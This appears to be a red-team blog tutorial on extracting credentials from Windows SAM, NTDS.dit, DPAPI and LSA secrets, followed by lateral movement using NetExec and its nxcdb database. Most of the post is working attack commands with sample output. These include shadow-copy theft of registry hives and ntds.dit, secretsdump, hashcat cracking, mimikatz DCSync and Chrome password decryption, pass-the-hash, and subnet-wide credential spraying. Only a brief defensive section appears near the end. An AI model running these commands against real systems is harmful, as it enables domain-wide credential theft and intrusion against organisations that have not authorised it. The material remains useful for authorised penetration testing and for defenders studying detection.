---
layout: post
title: "Windows Credential Stores: SAM, NTDS, DPAPI, and Lateral Movement"
category: "Windows Security"
date: 2025-11-15
readTime: "17 min"
tags: [windows, active-directory, credentials, ntds, sam, dpapi, netexec, nxcdb, lateral-movement]
excerpt: "Windows stores credentials across multiple locations. Understanding these stores and how to extract them is fundamental to domain compromise."
---

# Windows Credential Stores: SAM, NTDS, DPAPI, and Lateral Movement

## The Windows Credential Landscape

Windows is built around credential stores. Unlike Unix systems, which delegate authentication to a few centralized files, Windows distributes credential management across multiple specialized locations. Each store serves a different purpose and contains different credential types.

Understanding these stores is essential for red teamers because each represents an escalation opportunity. Local credential extraction enables lateral movement. Domain credential extraction enables domain-wide compromise. Application credential extraction enables further service compromise.

The challenge is that access to these stores requires administrative privileges, a catch-22 that attackers overcome through careful sequencing of attacks.

## The SAM Database: Local Machine Credentials

The Security Account Manager (SAM) database stores credentials for local user accounts on a Windows system. It's not a single file but a registry hive: `C:\\Windows\\System32\\config\\SAM`.

### What SAM Contains

The SAM database stores:
- Local user account names
- Password hashes (NTLM format, technically MD4 hashes)
- User SIDs (Security Identifiers, unique identifiers for accounts)
- Account metadata (creation date, last logon, lockout status)

While the database contains hashes rather than plaintext passwords, NTLM hashes can be cracked offline using dictionary attacks. Modern hardware can attempt billions of hashes per second against dictionary wordlists.

Alternatively, NTLM hashes enable pass-the-hash attacks. Rather than cracking the hash, an attacker uses it directly to authenticate. Many Windows services and protocols support NTLM authentication, accepting the hash itself as proof of identity.

### Extraction Challenges

The SAM hive is locked while Windows is running, actively used by the system for authentication. Extracting it requires either:

1. **Offline access**: Shut down the system and extract the hive from disconnected storage
2. **Volume Shadow Copy**: Use Windows's built-in backup mechanism to access locked files
3. **Kernel-level access**: Execute code with kernel privileges to bypass file locks
4. **Memory extraction**: Dump memory and extract credentials from processes

The most practical method during an engagement is Volume Shadow Copy (VSS).

```cmd
vssadmin create shadow /for=C:
vssadmin list shadows
copy \\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SAM C:\\temp\\sam
copy \\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM C:\\temp\\system
```

The SYSTEM hive is also required because it contains the BootKey, the encryption key used to encrypt SAM entries.

### Extracting Hashes

Once you possess both the SAM and SYSTEM hives, extraction on an attacker-controlled machine uses Impacket's secretsdump:

```bash
secretsdump.py -sam sam -system system LOCAL
```

The output resembles:

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
user:1001:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
```

Each line represents a user. The first hash (after the first colon) is the LM hash (legacy, often disabled). The second is the NTLM hash, the actual credential material.

The RID (Relative Identifier, the number after the username) is significant. RID 500 always represents the Administrator account.

### Cracking SAM Hashes

Offline cracking proceeds as any hash-cracking operation:

```bash
hashcat -m 1000 -a 0 hashes.txt rockyou.txt -r rules/OneRuleToRuleThemStill.rule
```

Mode 1000 specifies NTLM hashes. With moderate hardware (a modern GPU), cracking a significant portion of a wordlist happens in minutes.

## NTDS.dit: The Domain Controller Database

While SAM represents local credentials, NTDS.dit (NT Directory Services Directory Information Tree) represents the entire domain's credentials. This file exists on Domain Controllers and contains:

- Every user account in the domain (not just local admins)
- Every computer account (compromised computers can authenticate to other systems)
- Group memberships
- Domain trust relationships
- Password hashes for all domain accounts

For attackers, NTDS.dit is the crown jewel. Extracting it means extracting every credential in the domain.

### Location and Access

NTDS.dit resides at `C:\\Windows\\NTDS\\ntds.dit` on Domain Controllers. Like SAM, it's locked while Windows runs. The Active Directory service holds it open continuously.

Extracting it requires Administrative access to the Domain Controller itself. This might follow from:

1. Compromising a Domain Admin account
2. Compromising a Domain Controller directly
3. Leveraging a vulnerability in AD-related services
4. Social engineering an admin

Once you have administrative access, extraction again uses Volume Shadow Copy:

```cmd
vssadmin create shadow /for=C:
copy \\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\ntds.dit C:\\temp\\ntds.dit
copy \\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM C:\\temp\\system
```

### Extracting Domain Hashes

On an attacker system:

```bash
secretsdump.py -ntds ntds.dit -system system LOCAL -outputfile domain
```

This generates multiple output files, with the primary being `domain.ntds` containing all domain user hashes.

The krbtgt hash (RID 502) is especially significant. This account's hash serves as the encryption key for all Kerberos tickets in the domain. Possessing it enables forging tickets to any domain account (a "Golden Ticket" attack) and maintaining persistent access even after the actual account is disabled.

### DCSync Alternative

Rather than extracting files, a Domain Admin account can request domain credentials directly from the Domain Controller using the DC replication protocol. This leverages domain replication, which is meant to synchronize credentials between DCs.

```cmd
mimikatz # lsadump::dcsync /domain:corp.local /all /csv
```

No file extraction is necessary. Mimikatz impersonates a Domain Controller, requests all user credentials, and receives them. This technique is noisier (replication generates events) but doesn't require file access.

## DPAPI: Application Credential Encryption

DPAPI (Data Protection API) is Windows's built-in encryption system for user data. Applications use it to encrypt sensitive information:

- Saved web browser passwords (Chrome, Edge, IE)
- Windows Credential Manager entries (RDP credentials, network passwords)
- WiFi passwords
- VPN credentials
- Application-specific secrets

### Master Key Architecture

DPAPI uses a hierarchical key system:

1. **User password** derives a key during login
2. **Master key** is encrypted by the derived key, stored in `C:\\Users\\username\\AppData\\Roaming\\Microsoft\\Protect\\`
3. **Data encryption keys** are protected by the master key
4. **Encrypted data** is protected by data encryption keys

When a user logs in, Windows derives a key from their password and uses it to decrypt the master key. Applications then use this master key to encrypt/decrypt their stored secrets.

### Extracting DPAPI Secrets

Extracting DPAPI-protected credentials requires:

1. **Access to the encrypted files** (in the user's profile)
2. **Access to the master key** (in the protect directory)
3. **Knowledge of the user's password** or derivation of the key through other means

For a logged-in user, the master key is already decrypted in memory. Tools like SharpDPAPI can extract encrypted blobs and decrypt them:

```cmd
SharpDPAPI.exe machinetriage
```

This dumps all DPAPI secrets accessible from the current context. For a logged-in user, this typically includes stored passwords from browsers and credential manager.

For offline decryption (when the user isn't logged in), you need the user's password or use mimikatz's offline DPAPI cracking:

```cmd
mimikatz # dpapi::chrome /in:"C:\\Users\\john\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
```

Mimikatz attempts to decrypt Chrome stored passwords using the DPAPI master key.

## LSA Secrets and Service Credentials

LSA (Local Security Authority) Secrets are stored in the SECURITY registry hive and include:

- Service account passwords (services configured to run as specific users store credentials here)
- Auto-logon passwords (systems configured to login automatically store credentials here)
- Cached domain credentials (for users who've logged in)

Unlike SAM hashes, LSA Secrets often contain plaintext passwords. The SECURITY hive encrypts them with a key derived from the SYSTEM hive.

Extracting LSA Secrets:

```bash
secretsdump.py -security security -system system LOCAL
```

Output often reveals cleartext credentials:

```
[*] _SC_MSSQLSERVER
DOMAIN\\svc-sql:MySecureP@ssword123!

[*] DefaultPassword
AutoLogonPassword:AdminPassword456
```

These cleartext credentials enable immediate lateral movement. You've discovered a service account password.

## NetExec: Unified Credential Extraction

Rather than manually extracting files, NetExec (the successor to CrackMapExec) automates remote credential extraction against Windows systems.

### Remote SAM Extraction

Without shell access to the target, if you have administrative credentials:

```bash
netexec smb target.com -u admin -p password --sam
```

NetExec connects via SMB, extracts the SAM hive, decrypts it, and displays hashes, all remotely.

### Remote LSA Extraction

```bash
netexec smb target.com -u admin -p password --lsa
```

This extracts LSA Secrets remotely, often revealing cleartext service passwords.

### Remote NTDS Extraction

Against a Domain Controller:

```bash
netexec smb dc.corp.local -u admin -p password --ntds
```

NetExec extracts the NTDS.dit hive and displays every domain user hash.

### Pass-the-Hash Attacks

Rather than cracking hashes, use them directly:

```bash
netexec smb target.com -u administrator -H aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889 --sam
```

Many Windows services accept NTLM hashes for authentication without requiring the plaintext password.

### Network-Wide Dumping

Combine NetExec with a target list to extract credentials from multiple systems:

```bash
netexec smb targets.txt -u admin -p password --sam --lsa --shares
```

In minutes, you've extracted hashes and identified accessible shares across dozens of systems.

## The NetExec Database: Persistent Credential Management with nxcdb

One of NetExec's most powerful yet underutilized features is its built-in database system, accessible via the `nxcdb` command. During large-scale assessments spanning multiple days or involving multiple operators, manually tracking extracted credentials becomes untenable. The database solves this by automatically persisting every credential, host, and share discovered during the engagement.

### What nxcdb Stores

The NetExec database maintains a comprehensive record of the engagement:

- **Credentials**: Every extracted hash, plaintext password, and authentication material
- **Hosts**: All discovered systems with their operating systems and response characteristics
- **Shares**: Enumerated network shares with access permissions
- **Credential-to-Host Mappings**: Which credentials successfully authenticated to which systems

This persistent storage transforms NetExec from a one-off extraction tool into a stateful engagement management platform.

### Database Architecture

The database lives at `~/.nxc/workspaces/default/` by default. NetExec automatically updates it after every successful operation. No manual intervention is required for storage. The database is SQLite-based, making it lightweight and portable.

### Querying Stored Credentials

The `nxcdb` command provides several query interfaces:

```bash
# View all stored credentials
nxcdb creds

# Filter by domain
nxcdb creds -d corp.local

# Show only credentials with cleartext passwords
nxcdb creds --cleartext

# Display credentials for a specific user
nxcdb creds -u administrator
```

The output includes credential IDs, which become essential for reuse operations.

Example output:

```
Credentials
===========
| id | domain      | username      | password/hash                                                          |
|----|-------------|---------------|------------------------------------------------------------------------|
| 1  | corp.local  | Administrator | aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889      |
| 2  | corp.local  | svc-sql       | MySecureP@ssword123!                                                   |
| 3  | WORKSTATION | localadmin    | aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c      |
```

### Credential Reuse: The Power of ID-Based Authentication

Rather than repeatedly typing usernames and hashes, NetExec allows referencing stored credentials by their database ID:

```bash
# Use credential ID 1 against a target
netexec smb 192.168.1.50 -id 1

# Spray all stored credentials against a subnet
netexec smb 192.168.1.0/24 -id ALL

# Use multiple specific credentials
netexec smb targets.txt -id 1 -id 2 -id 3
```

The `-id ALL` option is particularly powerful. It attempts every stored credential against every target, automatically discovering where credentials are reused. In enterprise environments, administrators frequently reuse passwords across systems. This command exploits that tendency systematically.

### Tracking What Works Where

The database doesn't just store credentials, it tracks authentication success. After running credential sprays, query which credentials worked on which hosts:

```bash
# View all compromised hosts
nxcdb hosts

# Show which credentials worked on a specific host
nxcdb hosts -host 192.168.1.50

# Export the credential-to-host mapping
nxcdb export creds-by-host mapping.csv
```

This reveals credential reuse patterns. If `administrator`'s hash works on 50 systems, you've identified a privileged account with extensive lateral movement potential.

### Why This Matters

In real-world assessments, credential extraction isn't a one-time event. It's iterative. You extract credentials from Host A, use them to access Host B, extract more credentials, and continue. Without persistent storage, operators waste time re-extracting credentials they've already obtained or, worse, lose track of what they've discovered.

The database provides:

1. **Efficiency**: No redundant credential extraction
2. **Persistence**: Survives tool restarts and multi-day engagements
3. **Collaboration**: Multiple operators access the same credential pool
4. **Discovery**: Automated identification of credential reuse patterns
5. **Auditability**: Complete record of what was extracted and where it worked

### Advanced Usage: Workspace Management

For assessments involving multiple clients or network segments, NetExec supports workspace isolation:

```bash
# Create a new workspace
nxcdb workspace create client-pentest-2024

# Switch to it
nxcdb workspace use client-pentest-2024

# All subsequent operations use this workspace's database
netexec smb 10.20.30.0/24 -u admin -p password --sam

# Switch back to default
nxcdb workspace use default
```

Each workspace maintains its own isolated database. Credentials extracted in one workspace don't pollute another.

### Database Maintenance

Occasionally, database cleanup is necessary:

```bash
# Remove invalid credentials (those that never authenticated successfully)
nxcdb prune

# Clear all data (start fresh)
nxcdb clear

# Back up the database
cp ~/.nxc/workspaces/default/nxc.db ~/backups/engagement-backup.db
```

### Integration with Other Tools

While the database is NetExec-specific, its SQLite format allows external querying:

```bash
# Direct SQL query
sqlite3 ~/.nxc/workspaces/default/nxc.db "SELECT * FROM credentials WHERE domain='corp.local';"

# Extract for use in other tools
nxcdb export creds creds.txt
# Feed to hashcat, john, or custom scripts
```

This interoperability makes the database a central knowledge repository for the entire assessment.

Without the database, this workflow would require manual spreadsheet tracking or risk losing critical information between sessions.

## Defensive Implications

Organizations defend against credential extraction by:

- **Credential Guard**: A Windows feature that encrypts credentials in memory, preventing some extraction techniques
- **Local security policy hardening**: Reducing the number of local admin accounts, using strong passwords
- **Privileged Access Workstations (PAWs)**: Dedicated systems for admin activities, isolated from user networks
- **Enhanced monitoring**: Detecting VSS creation, registry access patterns, or credential extraction tools
- **Regular credential rotation**: Reducing the window during which extracted credentials remain valid
- **Unique credentials per system**: Preventing the password reuse that makes nxcdb-powered spraying so effective

Despite these defenses, credential extraction remains one of the most reliable attack vectors against Windows environments. The fundamental architecture (storing credentials for offline use) makes extraction inevitable in compromised environments. Tools like nxcdb make the exploitation of this architecture systematic and persistent.

## Conclusion

Windows credential stores represent different levels of compromise. Local SAM extraction enables lateral movement within a network. Domain credential extraction enables enterprise-wide compromise. Understanding these stores, their extraction methods, and their vulnerabilities is central to Windows penetration testing.

Tools like Impacket, Mimikatz, and NetExec operationalize extraction, automating what would otherwise be manual and time-consuming processes. Combined with proper access (administrative or Domain Controller level), these tools turn credential stores into keys that unlock entire networks.

The nxcdb database elevates NetExec from a collection of individual commands to a stateful engagement platform. It transforms credential extraction from isolated operations into a persistent, queryable knowledge base that grows throughout the assessment. For multi-day engagements or team-based operations, it's not just useful, it's essential.
